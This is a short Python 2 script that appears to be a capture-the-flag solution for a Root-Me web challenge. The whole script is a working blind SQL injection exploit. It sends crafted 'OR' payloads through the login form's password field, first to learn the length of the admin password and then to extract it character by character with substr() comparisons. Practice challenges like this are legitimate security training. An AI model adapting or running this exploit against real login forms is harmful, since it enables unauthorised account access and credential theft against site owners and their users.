import urllib
import urllib2
import string
password = ""


def request_page(payload):
    url = "http://challenge01.root-me.org/web-serveur/ch10/"
    values = {'username': 'xd', 'password': payload}
    data = urllib.urlencode(values)
    req = urllib2.Request(url, data)
    response = urllib2.urlopen(req)
    return response.read()

# find length
passLength = 40  # max
for i in range(1, 41):
    payload = "' OR (length((SELECT password from users where username='admin')) = " + \
        str(i)+") OR '1'='2"
    if request_page(payload).find('user1') != -1:
        print "[+] Password length found : %i" % i
        passLength = i
        break

# bruteforce password
for i in range(1, passLength+1):
    charList = string.printable
    for c in charList:
        payload = "' OR (substr((SELECT password from users where username='admin')," + \
            str(i)+",1) = '"+c+"') OR '1'='2"
        if request_page(payload).find('user1') != -1:
            print "[+] [%i] Char is found : " % i + c
            password += c
            break

print "password is : " + password
